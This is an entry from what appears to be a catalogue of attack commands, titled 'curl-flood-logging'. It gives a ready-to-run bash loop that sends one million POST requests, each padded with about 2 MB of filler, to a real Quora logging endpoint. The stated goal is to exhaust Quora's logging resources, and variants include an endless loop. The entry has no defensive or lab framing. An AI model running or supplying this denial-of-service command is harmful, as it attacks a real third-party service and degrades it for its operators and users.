---
id: cmd-flood-logging-001
data: >-
  for i in {1..1000000}; do curl -X POST
  'https://log.quora.com/ajax/batched_log_POST' -d 'json=%5B%22'$(python3 -c
  'import urllib.parse, json; print(urllib.parse.quote(json.dumps([{"filler":
  "a" * 2000000}]))')'%5D' --max-time 10; done
tags:
  - http
  - flood
  - dos
type: command
output: 'Multiple HTTP responses, starting with 200 OK, progressing to timeouts/errors'
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:30.769Z'
verified: false
validated: true
submitted: true
---
# curl-flood-logging

## Command

```bash
for i in {1..1000000}; do curl -X POST 'https://log.quora.com/ajax/batched_log_POST' -d 'json=%5B%22'$(python3 -c 'import urllib.parse, json; print(urllib.parse.quote(json.dumps([{"filler": "a" * 2000000}]))')'%5D' --max-time 10; done
```

## Description

Loops to send 1,000,000 oversized requests to exhaust Quora's logging resources.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `for i in {1..1000000}` | Bash loop for repetition | Yes |
| `curl -X POST ...` | Individual request with payload | Yes |
| `--max-time 10` | Timeout per request to avoid hangs | Yes |

## Examples

### Basic Usage

```bash
for i in {1..1000}; do curl ...; done
```

### Advanced Usage

```bash
while true; do curl ...; sleep 0.1; done
```

## Expected Output

Batch of responses showing increasing delays and failures due to resource exhaustion.

## Related

- [[commands/curl-send-oversized-log]]
